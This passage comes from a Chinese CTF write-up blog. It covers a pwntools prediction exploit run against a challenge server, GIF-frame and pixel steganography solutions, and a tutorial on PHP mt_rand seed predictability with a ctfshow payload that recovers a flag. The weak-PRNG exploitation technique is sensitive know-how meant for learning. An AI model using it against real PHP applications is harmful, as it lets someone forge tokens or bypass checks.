class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs autoit">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 <span class="hljs-built_in">exp</span>.py                                                                         <br>[*] Checking <span class="hljs-keyword">for</span> new versions of pwntools<br>    <span class="hljs-keyword">To</span> disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache<span class="hljs-number">-3.9</span>/update <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;never&#x27;</span> (old way).<br>    <span class="hljs-literal">Or</span> add the following lines <span class="hljs-keyword">to</span> ~/.pwn.conf <span class="hljs-literal">or</span> ~/.config/pwn.conf (<span class="hljs-literal">or</span> /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[*] A newer version of pwntools is available on pypi (<span class="hljs-number">4.7</span><span class="hljs-number">.0</span>.dev0 --&gt; <span class="hljs-number">4.7</span><span class="hljs-number">.0</span>b0).<br>    Update <span class="hljs-keyword">with</span>: $ pip install -U pwntools==<span class="hljs-number">4.7</span><span class="hljs-number">.0</span>b0<br>[+] Opening connection <span class="hljs-keyword">to</span> node4.buuoj.cn on port <span class="hljs-number">25868</span>: Done<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">14</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>)<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">16</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.sendline(list[i])<br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">0</span><br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">33</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">28</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>)<br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">1</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">3</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">4</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">9</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">10</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">12</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">13</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">18</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">20</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">22</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">24</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">26</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">28</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">29</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">31</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">32</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">33</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">35</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">38</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">39</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">40</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">41</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">44</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">45</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">46</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">48</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">50</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">53</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">54</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">55</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">58</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">60</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">61</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">66</span><br>[*] Closed connection <span class="hljs-keyword">to</span> node4.buuoj.cn port <span class="hljs-number">25868</span><br>[+] Flag: flag&#123;b<span class="hljs-string">&#x27;c069b2d7-0fca-4819-a656-44e4451deaaf&#x27;</span>&#125;<br>[+] Time: <span class="hljs-number">50.63801121711731</span>s<br></code></pre></td></tr></table></figure>


<h2 id="Just-a-GIF"><a href="#Just-a-GIF" class="headerlink" title="Just a GIF"></a>Just a GIF</h2><p>提取帧数，一共451帧,对比发现11帧一组，一共41组.</p>
<p>把除第1组之后的每一组的第n帧跟第一组的第n帧比较，相同为纯白，不同为纯黑</p>
<p>把同内容的图片作为一个系列，然后系列中的图片与该系列第一张图片比较，新建一张</p>
<p>83x83的空白图，把所有存在像素值不同的位置标记为黑色，即可得到隐藏的11张图片</p>
<p>中的1张，剩下的以此类推即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8 </span><br><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <br><br><span class="hljs-comment">#分离gif </span><br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Just_a_GIF.gif&#x27;</span>) <br>os.mkdir(<span class="hljs-string">&#x27;./png&#x27;</span>) <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.n_frames): <br>	img.seek(i) <br>	new = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, img.size) <br>	new.paste(img) <br>	new.save(<span class="hljs-string">&#x27;png\\&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br><br>    <br>    <br><span class="hljs-comment">#处理分离出来的png </span><br>os.mkdir(<span class="hljs-string">&#x27;./flag&#x27;</span>) <br><br>path1=<span class="hljs-string">r&quot;./flag/&quot;</span> <br>path2=<span class="hljs-string">r&quot;./png/&quot;</span> <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>): <br>	img=Image.<span class="hljs-built_in">open</span>(path2+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br>	<span class="hljs-comment">#隐藏的图片尺寸为83*83 </span><br>	img1=Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">83</span>,<span class="hljs-number">83</span>),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>)) <br>	<span class="hljs-comment">#图片每帧跟同内容的第一帧进行像素比较，不同处用黑色，叠加起来 </span><br>	<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>): <br>		im=Image.<span class="hljs-built_in">open</span>(path2+<span class="hljs-built_in">str</span>((h+<span class="hljs-number">1</span>)*<span class="hljs-number">11</span>+i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br>		width,height=img.size <br>		<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,width):<br>			<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,height): <br>				tmp = img.getpixel((j,k)) <br>				tmp1 = im.getpixel((j,k)) <br>				<span class="hljs-keyword">if</span> tmp != tmp1: <br>					img1.putpixel((j,k),(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) <br>	img1.save(path1+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br></code></pre></td></tr></table></figure>
<p>得到11张图片</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122323-509098.png" alt="image-20210815122322173"></p>
<p>按照10和11的顺序拼接得到</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122333-324537.png" alt="image-20210815122331942"></p>
<p>DataMatrix：<a target="_blank" rel="noopener" href="https://demo.dynamsoft.com/barcode-reader/">https://demo.dynamsoft.com/barcode-reader/</a></p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122350-188687.png" alt="image-20210815122347387"></p>
<h2 id="Nuclear-wastewater"><a href="#Nuclear-wastewater" class="headerlink" title="Nuclear wastewater"></a>Nuclear wastewater</h2><p>小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。</p>
<p>思路：直接处理图片的三个通道，观察rgb数值，并进行chr，可以发现有大量的重复的内容，猜测可以利用词频进行排序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>pic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Nuclear wastewater.png&#x27;</span>)<br>a, b = pic.size<br>list1 = []  <span class="hljs-comment">#将三个像素值都存入列表元素</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,b,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, a, <span class="hljs-number">10</span>):<br>        pixel = pic.getpixel((x, y))<br>        <span class="hljs-keyword">if</span> pixel == (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>):<br>             <span class="hljs-keyword">continue</span><br>        r, g, b1 = pixel<br>        list1.extend([r, g, b1])<br><span class="hljs-comment">#print(list1)</span><br><br>dic1 = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br>    dic1[i] = dic1.get(i, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span><br>result = <span class="hljs-built_in">sorted</span>(dic1.items(), key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> result:<br>    print(<span class="hljs-built_in">chr</span>(s[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theKEYis:</span><span class="hljs-meta">#R@/&amp;p~!(▒?£ñ$ªVJÞÍFjÀÈ÷¢©¼§UÌ¦õ±·ðäôÉCS</span><br><span class="hljs-number">2</span>ÚHÏ&gt;Á<br></code></pre></td></tr></table></figure>
<p>得到口令#R@/&amp;p~!，解压得到flag.txt</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122426-607150.png" alt="image-20210815122425969"></p>
<p>有猫腻，vim查看一下</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122440-299502.png" alt="image-20210815122438743"></p>
<p>零宽字节隐写，包含200C、200D、200E，</p>
<p>解题工具：<a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>先在下面设置一下，勾选零宽字符：</p>
<p>U+200C ZERO WIDTH NON-JOINER<br>U+200D ZERO WIDTH JOINER<br>U+200E LEFT-TO-RIGHT MARK</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122452-433384.png" alt="image-20210815122451134"></p>
<p>根据提示Citrix CTX1解密</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBI</span><br></code></pre></td></tr></table></figure>
<p>解码两次得到flag</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122503-379175.png" alt="image-20210815122502554"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/04/PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/">PHP伪随机数漏洞</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-08-04</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">2.8k</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>由于mt_rand()的生成的随机数只跟seed和调用该函数的次数有关。举一个简单的例子来说明一下这个问题，假设使用mt_srand(1111111)进行了一次播种操作，接下来调用mt_rand()函数，第一次生成的数值为a,第二次生成的为b，第三次生成的为c。任何一个人拿到这样的一串代码，所执行的结果都是跟刚刚描述的一样。所以当你的seed数值被他人知道后，就可以预测出你接下来的数值是多少，这就是该函数的一个问题，他并不能起到一个真随机数的作用。</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">mt_scrand() //播种 Mersenne Twister 随机数生成器。<br>mt_rand()   //生成随机数<br><br>srand() //给rand()函数播种<br>rand() //不指定参数时，范围0-32767<br><br><br>#mt_rand()和rand()产生的最大随机数都是2^31-1<br></code></pre></td></tr></table></figure>
<p>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</p>
<h3 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand()"></a>mt_srand()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mt_srand([ <span class="hljs-keyword">int</span> <span class="hljs-variable">$seed</span>] ) : <span class="hljs-keyword">void</span><br></code></pre></td></tr></table></figure>


<h3 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">mt_rand( <span class="hljs-keyword">void</span>) : <span class="hljs-keyword">int</span><br><br>mt_rand( <span class="hljs-keyword">int</span> <span class="hljs-variable">$min</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$max</span>) : <span class="hljs-keyword">int</span><br></code></pre></td></tr></table></figure>
<p>用 seed 来给随机数发生器播种。没有设定 seed 参数时，会被设为随时数。使用者在进行一次mt_srand()操作后，seed数值将被固定下来，给接下来的mt_rand()函数使用。</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand();  <br><span class="hljs-keyword">echo</span> mt_rand() . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand(<span class="hljs-number">5</span>, <span class="hljs-number">15</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>mt_srand(<span class="hljs-number">1234</span>);  <br><span class="hljs-keyword">echo</span> mt_rand() . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand(<span class="hljs-number">5</span>, <span class="hljs-number">15</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">497738439</span><br><span class="hljs-number">11</span><br><span class="hljs-number">1741177057</span><br><span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>




<h3 id="mt-rand-存在的问题"><a href="#mt-rand-存在的问题" class="headerlink" title="mt_rand()存在的问题"></a>mt_rand()存在的问题</h3><p>由于mt_rand()的生成的随机数只跟seed和调用该函数的次数有关。举一个简单的例子来说明一下这个问题，假设使用mt_srand(1111111)进行了一次播种操作，接下来调用mt_rand()函数，第一次生成的数值为a,第二次生成的为b，第三次生成的为c。任何一个人拿到这样的一串代码，所执行的结果都是跟刚刚描述的一样。所以当你的seed数值被他人知道后，就可以预测出你接下来的数值是多少，这就是该函数的一个问题，他并不能起到一个真随机数的作用。</p>
<p>说到mt_rand() 和mt_srand()，这里也顺便提及rand()和 srand()</p>
<p>代码实例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br>srand(<span class="hljs-number">123</span>);<br>mt_srand(<span class="hljs-number">1234</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;rand在种子是123时产生的随机数序列：\n&quot;</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span> ;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> rand().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;mt_srand在种子是1234时产生的随机数序列:\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span> ;<span class="hljs-variable">$k</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$k</span>++)&#123;<br>     <span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">rand在种子是<span class="hljs-number">123</span>时产生的随机数序列：<br><span class="hljs-number">440</span><br><span class="hljs-number">19053</span><br><span class="hljs-number">23075</span><br><span class="hljs-number">13104</span><br><span class="hljs-number">32363</span><br>mt_srand在种子是<span class="hljs-number">1234</span>时产生的随机数序列:<br><span class="hljs-number">1741177057</span><br><span class="hljs-number">1068724585</span><br><span class="hljs-number">1335968403</span><br><span class="hljs-number">400890732</span><br><span class="hljs-number">1196196624</span><br></code></pre></td></tr></table></figure>
<p>当种子固定时，每次运行代码时，mt_rand和rand所产生的的随机数分别是一样的,所以如果我们在代码中自己播种了随机数种子,但是泄露了这个种子,就会导致产生的随机数序列被别人猜到,造成安全问题。</p>
<p><strong>注意：自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。</strong></p>
<h2 id="固定的种子"><a href="#固定的种子" class="headerlink" title="固定的种子"></a>固定的种子</h2><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</p>
<p>我们来写段代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <br>mt_srand(<span class="hljs-number">12345</span>);            <span class="hljs-comment">#分发seed种子12345</span><br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;			<span class="hljs-comment">#mt_rand()生成随机数</span><br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>
<p>输出结果是162946439。</p>
<p>修改代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>mt_srand(<span class="hljs-number">12345</span>);    <br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span>    <br></code></pre></td></tr></table></figure>
<p>代码运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">第一次运行结果：   <br><span class="hljs-number">162946439</span><br><span class="hljs-number">247161732</span><br><span class="hljs-number">1463094264</span><br><span class="hljs-number">1878061366</span><br><span class="hljs-number">394962642</span><br>  <br>第二次运行结果：   <br><span class="hljs-number">162946439</span><br><span class="hljs-number">247161732</span><br><span class="hljs-number">1463094264</span><br><span class="hljs-number">1878061366</span><br><span class="hljs-number">394962642</span><br>  <br>第三次运行结果：   <br><span class="hljs-number">162946439</span><br><span class="hljs-number">247161732</span><br><span class="hljs-number">1463094264</span><br><span class="hljs-number">1878061366</span><br><span class="hljs-number">394962642</span><br></code></pre></td></tr></table></figure>
<p>无论运行多少次，结果都是一样的。当种子不变时，实际上生成的随机数是固定的。而这就是伪随机数漏洞</p>
<h2 id="得到相同的种子"><a href="#得到相同的种子" class="headerlink" title="得到相同的种子"></a>得到相同的种子</h2><p>这里有个trick是,可以通过Keep-Alive HTTP头,迫使服务端使用同一PHP进程相应请求,所以也就能使种子保持一直.</p>
<p>别的就依赖PHP程序员出错了.</p>
<h2 id="常见题型"><a href="#常见题型" class="headerlink" title="常见题型"></a>常见题型</h2><h3 id="1-根据种子预测随机数"><a href="#1-根据种子预测随机数" class="headerlink" title="1.根据种子预测随机数"></a>1.根据种子预测随机数</h3><p>根据题中所给的种子生成随机数</p>
<p><strong>ctfshow-web入门-web24</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    mt_srand(<span class="hljs-number">372619038</span>);<br>    <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$r</span>)===intval(mt_rand()))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>显然是伪随机数，编写php脚本用种子生成随机数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">372619038</span>);<br><span class="hljs-keyword">echo</span> mt_rand();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>运行得到随机数1155388967</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">Paylaod: ?r=<span class="hljs-number">1155388967</span><br><span class="hljs-comment">#ctfshow&#123;14824218-bc8e-452e-a581-e910df8f1cab&#125;</span><br></code></pre></td></tr></table></figure>
